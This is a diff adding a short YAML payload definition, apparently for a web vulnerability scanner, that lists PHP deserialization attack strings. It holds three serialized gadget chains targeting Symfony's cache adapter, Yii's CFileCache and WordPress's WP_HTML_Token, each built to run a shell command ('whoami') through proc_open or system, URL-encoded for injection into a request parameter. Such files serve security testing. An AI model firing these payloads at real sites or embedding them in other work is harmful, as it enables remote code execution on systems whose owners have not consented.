@@ -1,0 +1,9 @@
+payload:
+  - 'O:43:"Symfony\Component\Cache\Adapter\ApcuAdapter":3:{s:64:"Symfony\Component\Cache\Adapter\AbstractAdaptermergeByLifetime";s:9:"proc_open";s:58:"Symfony\Component\Cache\Adapter\AbstractAdapternamespace";a:0:{}s:57:"Symfony\Component\Cache\Adapter\AbstractAdapterdeferred";s:6:"whoami";}'
+  - 'O:11:"CDbCriteria":1:{s:6:"params";O:12:"CMapIterator":3:{s:16:"CMapIterator_d";O:10:"CFileCache":7:{s:9:"keyPrefix";s:0:"";s:7:"hashKey";b:0;s:10:"serializer";a:1:{i:1;s:9:"os.system";}s:9:"cachePath";s:10:"data:text/";s:14:"directoryLevel";i:0;s:11:"embedExpiry";b:1;s:15:"cacheFileSuffix";s:32:";base64,OTk5OTk5OTk5OXdob2FtaQ==";}s:19:"CMapIterator_keys";a:1:{i:0;i:0;}s:18:"CMapIterator_key";i:0;}}'
+  - 'O:13:"WP_HTML_Token":2:{s:13:"bookmark_name";s:6:"whoami";s:10:"on_destroy";s:9:"os.system";}'
+encoder:
+  - URLEncode
+placeholder:
+  - URLParam
+type: DeserializePHP
